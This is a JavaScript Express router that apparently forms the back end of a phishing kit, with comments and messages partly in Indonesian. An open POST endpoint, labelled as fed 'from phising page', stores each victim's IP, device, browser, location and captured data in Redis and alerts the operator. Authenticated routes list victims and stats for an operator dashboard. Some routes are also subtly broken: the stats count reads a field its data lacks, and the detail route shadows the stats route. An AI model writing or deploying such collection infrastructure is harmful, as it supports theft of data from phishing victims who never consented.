import express from 'express';
import redis from '../lib/upstash.js';
import { authMiddleware } from '../middleware/auth.js';

const router = express.Router();

// Get all victims for current user
router.get('/', authMiddleware, async (req, res) => {
  try {
    const { username } = req.user;
    const victims = await redis.smembers(`victims:${username}`);
    const result = [];

    for (const victimId of victims) {
      const data = await redis.get(`victim:${username}:${victimId}`);
      if (data) {
        result.push(JSON.parse(data));
      }
    }

    res.json(result);
  } catch (err) {
    console.error('Get victims error:', err);
    res.status(500).json({ message: 'Terjadi kesalahan server' });
  }
});

// Get victim detail
router.get('/:id', authMiddleware, async (req, res) => {
  try {
    const { username } = req.user;
    const { id } = req.params;

    const data = await redis.get(`victim:${username}:${id}`);
    if (!data) {
      return res.status(404).json({ message: 'Victim tidak ditemukan' });
    }

    res.json(JSON.parse(data));
  } catch (err) {
    console.error('Get victim detail error:', err);
    res.status(500).json({ message: 'Terjadi kesalahan server' });
  }
});

// Add victim (from phising page)
router.post('/', async (req, res) => {
  try {
    const { userId, ip, device, browser, location, data } = req.body;

    if (!userId || !ip) {
      return res.status(400).json({ message: 'userId dan ip wajib diisi' });
    }

    const victimId = ip.replace(/\./g, '_');
    const victimKey = `victim:${userId}:${victimId}`;
    const existing = await redis.get(victimKey);

    let victimData;
    if (existing) {
      victimData = JSON.parse(existing);
      victimData.lastSeen = new Date().toISOString();
      victimData.data = { ...victimData.data, ...data };
      victimData.status = 'online';
    } else {
      victimData = {
        id: victimId,
        ip,
        device: device || 'Unknown',
        browser: browser || 'Unknown',
        location: location || 'Unknown',
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        status: 'online',
        data: data || {}
      };
      await redis.sadd(`victims:${userId}`, victimId);
    }

    await redis.set(victimKey, JSON.stringify(victimData));

    // Send notification via SSE or WebSocket
    await redis.publish('notifications', JSON.stringify({
      userId,
      message: `New victim detected: ${ip}`,
      time: new Date().toISOString()
    }));

    res.status(201).json({ message: 'Victim data saved', victim: victimData });
  } catch (err) {
    console.error('Add victim error:', err);
    res.status(500).json({ message: 'Terjadi kesalahan server' });
  }
});

// Get stats
router.get('/stats', authMiddleware, async (req, res) => {
  try {
    const { username } = req.user;
    const victims = await redis.smembers(`victims:${username}`);
    
    res.json({
      totalVictims: victims.length,
      onlineUsers: victims.filter(v => v.status === 'online').length || 0,
      activeTools: 0
    });
  } catch (err) {
    console.error('Get stats error:', err);
    res.status(500).json({ message: 'Terjadi kesalahan server' });
  }
});

// Get notifications
router.get('/notifications', authMiddleware, async (req, res) => {
  try {
    const notifications = await redis.lrange('notifications:global', 0, 20);
    const parsed = notifications.map(n => JSON.parse(n));
    res.json(parsed);
  } catch (err) {
    console.error('Get notifications error:', err);
    res.json([]);
  }
});

// Get news
router.get('/news', authMiddleware, async (req, res) => {
  try {
    const news = await redis.lrange('news:global', 0, 5);
    const parsed = news.map(n => JSON.parse(n));
    res.json(parsed);
  } catch (err) {
    console.error('Get news error:', err);
    res.json([]);
  }
});

export default router;
